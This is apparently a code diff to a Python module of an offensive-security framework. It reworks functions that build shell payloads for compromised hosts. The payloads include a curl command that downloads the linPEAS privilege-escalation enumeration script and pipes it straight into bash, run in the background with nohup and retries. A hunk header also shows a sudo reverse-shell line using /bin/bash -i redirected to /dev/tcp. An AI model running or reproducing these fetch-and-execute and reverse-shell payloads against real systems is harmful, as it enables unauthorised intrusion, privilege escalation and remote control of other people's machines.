@@ -94,36 +94,10 @@ class Module(BaseModule):
                 prep_local_env(csp=csp, task_name=task_name)
                 session.log("prep_local_env complete")
 
-            def enumerate(command="curl -L https://github.com/peass-ng/PEASS-ng/releases/download/20240414-ed0a5fac/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files | tee /tmp/linpeas.txt"):
-                payload = f"""
-COMMAND="{command}"
+            def enumerate(csp, command="curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information | tee /tmp/linpeas.txt"):
+                # create a wait and retry payload
+                payload = retry_command(command=command)
 
-# Start the long-running command using nohup in the background
-nohup /bin/bash -c "$COMMAND" >/dev/null 2>&1 &
-
-# Store the Process ID of the background command
-PID=$!
-
-# Monitoring loop to check if the process is still running
-while kill -0 $PID 2>/dev/null; do
-    echo "Process $PID is still running..."
-    sleep 10
-done
-
-# Wait for the process to finish and capture its exit status
-wait $PID
-EXIT_STATUS=$?
-
-# Check the exit status of the process
-if [ $EXIT_STATUS -ne 0 ]; then
-    echo "Process $PID has finished with an error."
-    exit $EXIT_STATUS
-else
-    echo "Process $PID has completed successfully."
-fi
-
-exit 0
-"""
                 # run host enumeration
                 try:
                     session.log("payload loaded and ready")
@@ -271,6 +245,9 @@ nohup /bin/sh -c 'sudo /bin/bash -c "TASK={task} /bin/bash -i >& /dev/tcp/{rever
 
             def retry_command(command, max_attempts=5, sleep=10):
                 return f"""
+# command to execute
+COMMAND="{command}"
+
 # Max number of attempts to start the Docker container
 max_attempts={max_attempts}
 attempt=0
@@ -278,13 +255,24 @@ attempt=0
 while true; do
     # Increment the attempt counter
     ((attempt++))
-    echo "Attempt $attempt of $max_attempts"
+    # Start the long-running command using nohup in the background
+    nohup /bin/bash -c "$COMMAND" >/dev/null 2>&1 &
 
-    # Try command
-    {command}
+    # Store the Process ID of the background command
+    PID=$!
+
+    # Monitoring loop to check if the process is still running
+    while kill -0 $PID 2>/dev/null; do
+        echo "Process $PID is still running..."
+        sleep {sleep}
+    done
+
+    # Wait for the process to finish and capture its exit status
+    wait $PID
+    EXIT_STATUS=$?
 
     # Check if the command was successful
-    if [[ $? -eq 0 ]]; then
+    if [[ $EXIT_STATUS -eq 0 ]]; then
         echo "Command executed successfully."
         break
     else
@@ -294,11 +282,8 @@ while true; do
     # Check if maximum attempts have been reached
     if [[ $attempt -eq $max_attempts ]]; then
         echo "Maximum attempts reached, failing now."
-        exit 1
+        break
     fi
-
-    # Wait for a little while before retrying
-    sleep {sleep}
 done
 """
 
